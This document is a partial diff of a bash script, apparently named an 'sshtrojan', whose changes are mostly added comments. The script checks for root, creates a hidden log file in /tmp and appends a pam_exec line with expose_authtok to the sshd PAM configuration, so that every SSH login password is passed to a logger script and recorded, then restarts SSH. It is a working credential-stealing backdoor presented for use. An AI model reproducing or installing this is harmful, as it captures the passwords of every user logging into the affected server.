@@ -2,21 +2,22 @@
 
 file_log="/tmp/.log_sshtrojan1.txt"
 
+#Check root permissions
 if [[ $EUID -ne 0 ]]; then
   echo "You need root privileges to run this program"
   exit 1
 fi
 
+#Check log file exists or not
 if [[ -e $file_log ]]; then
   echo "File $file_log was created"
 else
   touch $file_log
 fi
 
-echo "Time: " `date` >> $file_log
-
 path_script="/usr/local/bin/sshloggerscript.sh"
 
+#Check script exists or not
 if [[ -e $path_script ]]; then
   echo "Script $path_script was created"
 else
@@ -41,4 +42,5 @@ cat << EOF >> $file_pamsshd
 auth       required   pam_exec.so   expose_authtok   seteuid   log=$file_log   $path_script
 EOF
 
+#ssh restarting
 /etc/init.d/ssh restart
